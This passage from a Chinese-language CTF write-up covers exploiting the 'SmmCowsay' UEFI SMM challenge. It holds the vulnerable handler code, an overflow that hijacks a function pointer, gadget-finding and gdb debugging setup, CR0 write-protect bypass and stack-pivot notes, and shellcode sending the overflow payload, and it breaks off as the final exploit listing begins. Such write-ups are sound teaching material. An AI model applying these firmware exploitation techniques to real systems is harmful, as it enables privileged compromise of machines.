sizeof(CHAR16);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Buffer = AllocateRuntimeZeroPool(sizeof(*Buffer) + MessageLen);</span></span><br><span class="line"><span class="addition">+  if (!Buffer)</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Buffer-&gt;HeaderGuid = gEfiSmmCowsayCommunicationGuid;</span></span><br><span class="line"><span class="addition">+  Buffer-&gt;MessageLength = MessageLen;</span></span><br><span class="line"><span class="addition">+  CopyMem(Buffer-&gt;Data, Message, MessageLen);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  mSmmCommunication-&gt;Communicate(</span></span><br><span class="line"><span class="addition">+    mSmmCommunication,</span></span><br><span class="line"><span class="addition">+    Buffer,</span></span><br><span class="line"><span class="addition">+    NULL</span></span><br><span class="line"><span class="addition">+  );</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  FreePool(Buffer);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br></pre></td></tr></table></figure><p>变化较大的是 SmmCowsay 的 patch 文件：  </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+EFI_STATUS</span></span><br><span class="line"><span class="addition">+EFIAPI</span></span><br><span class="line"><span class="addition">+SmmCowsayHandler (</span></span><br><span class="line"><span class="addition">+  IN EFI_HANDLE  DispatchHandle,</span></span><br><span class="line"><span class="addition">+  IN CONST VOID  *Context         OPTIONAL,</span></span><br><span class="line"><span class="addition">+  IN OUT VOID    *CommBuffer      OPTIONAL,</span></span><br><span class="line"><span class="addition">+  IN OUT UINTN   *CommBufferSize  OPTIONAL</span></span><br><span class="line"><span class="addition">+  )</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+  EFI_STATUS Status;</span></span><br><span class="line"><span class="addition">+  UINTN TempCommBufferSize;</span></span><br><span class="line"><span class="addition">+  UINT64 Canary;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  DEBUG ((DEBUG_INFO, &quot;SmmCowsay SmmCowsayHandler Enter\n&quot;));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (!CommBuffer || !CommBufferSize)</span></span><br><span class="line"><span class="addition">+    return EFI_SUCCESS;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  TempCommBufferSize = *CommBufferSize;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (!AsmRdRand64(&amp;Canary))</span></span><br><span class="line"><span class="addition">+    return EFI_SUCCESS;</span></span><br><span class="line"><span class="addition">+  mDebugData.Canary = Canary;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Status = SmmCopyMemToSmram(mDebugData.Message, CommBuffer, TempCommBufferSize);</span></span><br><span class="line"><span class="addition">+  if (EFI_ERROR(Status))</span></span><br><span class="line"><span class="addition">+    goto out;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (mDebugData.Canary != Canary) &#123;</span></span><br><span class="line"><span class="addition">+    // We probably overrun into libraries. Don&#x27;t trust anything. Make triple fault here.</span></span><br><span class="line"><span class="addition">+    while (TRUE) &#123;</span></span><br><span class="line"><span class="addition">+      __asm__ __volatile__ (</span></span><br><span class="line"><span class="addition">+        &quot;push $0\n&quot;</span></span><br><span class="line"><span class="addition">+        &quot;push $0\n&quot;</span></span><br><span class="line"><span class="addition">+        &quot;lidt (%%rsp)\n&quot;</span></span><br><span class="line"><span class="addition">+        &quot;add $16,%%rsp\n&quot;</span></span><br><span class="line"><span class="addition">+        &quot;ud2\n&quot;</span></span><br><span class="line"><span class="addition">+        : : : &quot;memory&quot;</span></span><br><span class="line"><span class="addition">+      );</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (mDebugData.Icebp) &#123;</span></span><br><span class="line"><span class="addition">+    // If you define WANT_ICEBP in QEMU you actually get a breakpoint right here.</span></span><br><span class="line"><span class="addition">+    // Have fun playing with SMM.</span></span><br><span class="line"><span class="addition">+    __asm__ __volatile__ (</span></span><br><span class="line"><span class="addition">+      &quot;.byte 0xf1&quot; // icebp / int1</span></span><br><span class="line"><span class="addition">+      : : : &quot;memory&quot;</span></span><br><span class="line"><span class="addition">+    );</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  SetMem(mDebugData.Message, sizeof(mDebugData.Message), 0);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  mDebugData.CowsayFunc(CommBuffer, TempCommBufferSize);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+out:</span></span><br><span class="line"><span class="addition">+  DEBUG ((DEBUG_INFO, &quot;SmmCowsay SmmCowsayHandler Exit\n&quot;));</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  return EFI_SUCCESS;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br></pre></td></tr></table></figure><p>可以看到他是利用 SmmCopyMemToSmram 函数将用户输入的内容 CommBuffer 拷贝进 mDebugData.Message 中，拷贝的长度是 TempCommBufferSize。然后经过一系列检测发现没有问题后就调用函数指针 mDebugData.CowsayFunc。<br>说到这里，漏洞就非常的明显了，因为 TempCommBufferSize 的长度是用户自定义的，所以我们可以很容易的构造出溢出。接下来看一下 mDebugData 的结构：  </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+struct &#123;</span></span><br><span class="line"><span class="addition">+  CHAR16 Message[200];</span></span><br><span class="line"><span class="addition">+  VOID EFIAPI (* volatile CowsayFunc)(IN CONST CHAR16 *Message, IN UINTN MessageLen);</span></span><br><span class="line"><span class="addition">+  BOOLEAN volatile Icebp;</span></span><br><span class="line"><span class="addition">+  UINT64 volatile Canary;</span></span><br><span class="line"><span class="addition">+&#125; mDebugData;</span></span><br><span class="line"><span class="addition">+</span></span><br></pre></td></tr></table></figure><p>该结构体虽然自己实现了一个 Canary 用来检测是否发生溢出，可是他并不能保护到他上面的函数指针，也就是说我们能够通过溢出来劫持这一个函数指针。  </p><p>在进入到下一步之前，我们需要解决两个问题：1、如何找 gadget 2、如何进行调试<br>对于定一个问题，我们可以在 qemu 的启动脚本中加入下面这行：  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-global isa-debugcon.iobase=0x402 -debugcon file:./debug.log</span><br></pre></td></tr></table></figure><p>启动 qemu 后他就能将调试信息保存到当前目录下的 debug.log 文件中，然后我们就能够在这个文件中找到各个可执行文件的入口地址：  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">or4nge@localhost:/mnt/d/desktop/cow/run$ <span class="built_in">cat</span> debug.log | grep <span class="string">&#x27;SMM driver&#x27;</span></span><br><span class="line">Loading SMM driver at 0x00007FE3000 EntryPoint=0x00007FE526B CpuIo2Smm.efi</span><br><span class="line">Loading SMM driver at 0x00007FD9000 EntryPoint=0x00007FDC6E4 SmmLockBox.efi</span><br><span class="line">Loading SMM driver at 0x00007FBF000 EntryPoint=0x00007FCC246 PiSmmCpuDxeSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007F99000 EntryPoint=0x00007F9C851 FvbServicesSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007F83000 EntryPoint=0x00007F8BAD0 VariableSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007EE7000 EntryPoint=0x00007EE9D0F SmmCowsay.efi</span><br><span class="line">Loading SMM driver at 0x00007EDF000 EntryPoint=0x00007EE2684 CpuHotplugSmm.efi</span><br><span class="line">Loading SMM driver at 0x00007EDD000 EntryPoint=0x00007EE2A1E SmmFaultTolerantWriteDxe.efi</span><br></pre></td></tr></table></figure><p>由于没有开启 ASLR，所以每次运行这个地址是不会变的，然后我们就可以使用类似于下面这中方法在各个 efi 文件中寻找 gadget  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary CpuIo2Smm.efi  --offset 0x00007FE3000 </span><br><span class="line">ROPgadget --binary SmmLockBox.efi --offset 0x00007FD9000 </span><br><span class="line"><span class="comment"># ......</span></span><br></pre></td></tr></table></figure><p>接下来是如何调试，其实调试方法和平时调试内核一样，而且各个 efi 的基地址也能通过上面的方法获得，不过这里我阅读了 Marco Bonelli 的 wp 后发现可以舒服很多。<br>这道题目已经给出了每一个 efi 的符号表，所以 Marco Bonelli 写了个 python 脚本在启动 gdb 时能够直接将符号导入，其脚本 gdb_plugin.py 如下：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AddAllSymbols</span>(gdb.Command):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span> (self):</span><br><span class="line">        <span class="built_in">super</span> (AddAllSymbols, self).__init__ (<span class="string">&#x27;add-all-symbols&#x27;</span>,</span><br><span class="line">            gdb.COMMAND_OBSCURE, gdb.COMPLETE_NONE, <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">invoke</span>(<span class="params">self, args, from_tty</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Adding symbols for all EFI drivers...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;debug.log&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                <span class="keyword">if</span> line.startswith(<span class="string">&#x27;Loading SMM driver at&#x27;</span>):</span><br><span class="line">                    line = line.split()</span><br><span class="line">                    base = line[<span class="number">4</span>]</span><br><span class="line">                <span class="keyword">elif</span> line.startswith(<span class="string">&#x27;Loading driver at&#x27;</span>) <span class="keyword">or</span> line.startswith(<span class="string">&#x27;Loading PEIM at&#x27;</span>):</span><br><span class="line">                    line = line.split()</span><br><span class="line">                    base = line[<span class="number">3</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                path = <span class="string">&#x27;../edk2_artifacts/&#x27;</span> + line[-<span class="number">1</span>].replace(<span class="string">&#x27;.efi&#x27;</span>, <span class="string">&#x27;.debug&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> os.path.isfile(path):</span><br><span class="line">                    gdb.execute(<span class="string">&#x27;add-symbol-file &#x27;</span> + path + <span class="string">&#x27; -readnow -o &#x27;</span> + base)</span><br><span class="line"></span><br><span class="line">AddAllSymbols()</span><br></pre></td></tr></table></figure><p>script.gdb：  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">target remote :1234</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> gdb_plugin.py</span><br><span class="line">add-all-symbols</span><br><span class="line"></span><br><span class="line">b *(SmmCowsayHandler + 770)</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p>会到漏洞利用，能够劫持后我们的问题就转换到要如何获取 flag。前面我们说过 flag 对应的物理页被设置成不可读，所以我们要修改 cr0 寄存器来让他可读。我们可以看一下此时 cr0 寄存器的值：  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; i r cr0</span><br><span class="line">cr0            0x80010033          [ PG WP NE ET MP PE ]</span><br></pre></td></tr></table></figure><p>下面来自 eastxuelian 师傅的解释：  </p><blockquote><p>在当前的 CR0 设置中，开启的保护包括：</p><p>分页机制 (PG)，允许虚拟内存管理。<br>写保护 (WP)，保护内存页面免于非法写入，增强安全性。<br>保护模式 (PE)，提供内存段保护和权限分级。<br>在 x86 架构中，CR0 寄存器的 WP 位直接控制写保护（WriteProtect），而读保护（ReadProtect）通常不是由 CR0 直接控制。</p><p>读取访问的保护通常是通过页表中的权限位来控制的，这些位定义哪些进程可以读取特定的内存页。例如，页表中的某些位可以设置成允许或禁止用户模式的代码读取特定的内存页面。</p><p>写保护可以直接把 cr0 的第 16 位设置为 0 来绕过，接下来就可以随意篡改页表项或者代码段了，前者可以完成后续利用而后者可以往代码段写入 shellcode（NX 保护与 EFER 寄存器、页表项有关）</p></blockquote><p>我们可以通过 rop 来实现这个操作，可是我们的操作非常的有限，因为只有一次任意地址 call，这个时候我们就需要想办法栈迁移。这里我选择使用一个比较简单的栈迁移方式，在 UEFI 中存在一个类似于 kernel 的 pt_regs 结构。<br>我们可以写个简单的 shellcode 来验证一下：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">payload  = <span class="string">b&#x27;a&#x27;</span> * <span class="number">400</span> + p64(<span class="number">0xdeadbeafdeadbeaf</span>)</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* Copy data into allocated buffer */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + data]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;<span class="number">0x18</span> + <span class="built_in">len</span>(payload)&#125;</span></span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 0x1111111111111111</span></span><br><span class="line"><span class="string">    mov rsi, 0x2222222222222222</span></span><br><span class="line"><span class="string">    mov rdi, 0x3333333333333333</span></span><br><span class="line"><span class="string">    mov rbp, 0x4444444444444444</span></span><br><span class="line"><span class="string">    mov r9 , 0x5555555555555555</span></span><br><span class="line"><span class="string">    mov r10, 0x6666666666666666</span></span><br><span class="line"><span class="string">    mov r11, 0x7777777777777777</span></span><br><span class="line"><span class="string">    mov r12, 0x8888888888888888</span></span><br><span class="line"><span class="string">    mov r13, 0x9999999999999999</span></span><br><span class="line"><span class="string">    mov r14, 0xaaaaaaaaaaaaaaaa</span></span><br><span class="line"><span class="string">    mov r15, 0xbbbbbbbbbbbbbbbb</span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">data:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>                   /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    /* payload will be appended here to serve as Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + payload.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br></pre></td></tr></table></figure><p>可以看到 r13、r14、r15 的值给保存到栈上  </p><img src="/2024/12/14/uefi/22.png" class="" title="我的图图呢">  <p>我们再来看一下调用完函数指针后程序会如何执行：  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30i 0x7ee8fc3+0x302</span><br><span class="line">=&gt; 0x7ee92c5 &lt;SmmCowsayHandler+770&gt;:    call   rax</span><br><span class="line">   0x7ee92c7 &lt;SmmCowsayHandler+772&gt;:    <span class="built_in">test</span>   bl,bl</span><br><span class="line">   0x7ee92c9 &lt;SmmCowsayHandler+774&gt;:    je     0x7ee92f7 &lt;SmmCowsayHandler+820&gt;</span><br><span class="line">   0x7ee92cb &lt;SmmCowsayHandler+776&gt;:    lea    rdx,[rip+0x1bbb]        <span class="comment"># 0x7eeae8d &lt;@IoWriteFifo32_Done+1851&gt;</span></span><br><span class="line">   0x7ee92d2 &lt;SmmCowsayHandler+783&gt;:    mov    ecx,0x40</span><br><span class="line">   0x7ee92d7 &lt;SmmCowsayHandler+788&gt;:    call   0x7ee8f5e &lt;DebugPrint&gt;</span><br><span class="line">   0x7ee92dc &lt;SmmCowsayHandler+793&gt;:    jmp    0x7ee92f7 &lt;SmmCowsayHandler+820&gt;</span><br><span class="line">   0x7ee92de &lt;SmmCowsayHandler+795&gt;:    mov    r9,r13</span><br><span class="line">   0x7ee92e1 &lt;SmmCowsayHandler+798&gt;:    mov    r8,r12</span><br><span class="line">   0x7ee92e4 &lt;SmmCowsayHandler+801&gt;:    mov    ecx,0x80000000</span><br><span class="line">   0x7ee92e9 &lt;SmmCowsayHandler+806&gt;:    lea    rdx,[rip+0x1bbe]        <span class="comment"># 0x7eeaeae &lt;@IoWriteFifo32_Done+1884&gt;</span></span><br><span class="line">   0x7ee92f0 &lt;SmmCowsayHandler+813&gt;:    call   0x7ee8f5e &lt;DebugPrint&gt;</span><br><span class="line">   0x7ee92f5 &lt;SmmCowsayHandler+818&gt;:    jmp    0x7ee92c7 &lt;SmmCowsayHandler+772&gt;</span><br><span class="line">   0x7ee92f7 &lt;SmmCowsayHandler+820&gt;:    add    rsp,0x40</span><br><span class="line">   0x7ee92fb &lt;SmmCowsayHandler+824&gt;:    xor    eax,eax</span><br><span class="line">   0x7ee92fd &lt;SmmCowsayHandler+826&gt;:    pop    rbx</span><br><span class="line">   0x7ee92fe &lt;SmmCowsayHandler+827&gt;:    pop    rsi</span><br><span class="line">   0x7ee92ff &lt;SmmCowsayHandler+828&gt;:    pop    rdi</span><br><span class="line">   0x7ee9300 &lt;SmmCowsayHandler+829&gt;:    pop    r12</span><br><span class="line">   0x7ee9302 &lt;SmmCowsayHandler+831&gt;:    pop    r13</span><br><span class="line">   0x7ee9304 &lt;SmmCowsayHandler+833&gt;:    ret</span><br></pre></td></tr></table></figure><p>可以看到在最后面的 pop 的时候 r14、r15 寄存器的值被保留，所以我们可以寻找类似于 add rsp、ret * 这样子的 gadget 覆盖函数指针，然后在 r14、r15 寄存器中放置 gadget 将 rsp 栈迁移到我们的 rop 中。</p><p>除了这种方法，其实 EDK2 中还存在一些非常好用的 <a href="https://github.com/tianocore/edk2/blob/86c8d69146310f24069701053a27153ae536ebba/MdePkg/Library/BaseLib/X64/LongJump.nasm#L54">gadget</a>：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mov     rbx, [rcx]</span><br><span class="line">mov     rsp, [rcx + 8]</span><br><span class="line">mov     rbp, [rcx + 0x10]</span><br><span class="line">mov     rdi, [rcx + 0x18]</span><br><span class="line">mov     rsi, [rcx + 0x20]</span><br><span class="line">mov     r12, [rcx + 0x28]</span><br><span class="line">mov     r13, [rcx + 0x30]</span><br><span class="line">mov     r14, [rcx + 0x38]</span><br><span class="line">mov     r15, [rcx + 0x40]</span><br><span class="line">; load non-volatile fp registers</span><br><span class="line">ldmxcsr [rcx + 0x50]</span><br><span class="line">movdqu  xmm6,  [rcx + 0x58]</span><br><span class="line">movdqu  xmm7,  [rcx + 0x68]</span><br><span class="line">movdqu  xmm8,  [rcx + 0x78]</span><br><span class="line">movdqu  xmm9,  [rcx + 0x88]</span><br><span class="line">movdqu  xmm10, [rcx + 0x98]</span><br><span class="line">movdqu  xmm11, [rcx + 0xA8]</span><br><span class="line">movdqu  xmm12, [rcx + 0xB8]</span><br><span class="line">movdqu  xmm13, [rcx + 0xC8]</span><br><span class="line">movdqu  xmm14, [rcx + 0xD8]</span><br><span class="line">movdqu  xmm15, [rcx + 0xE8]</span><br><span class="line">mov     rax, rdx               ; set return value</span><br><span class="line">jmp     qword [rcx + 0x48]</span><br></pre></td></tr></table></figure><p>它可以用第一个参数指向的内存上的信息设置好 rsp 与其它寄存器，再跳转到目标地址上，简直是栈迁移的梦中情 gadget（笑  </p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><p>最终 exp 如下，rop 用的是 Marco Bonelli 师傅的：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span 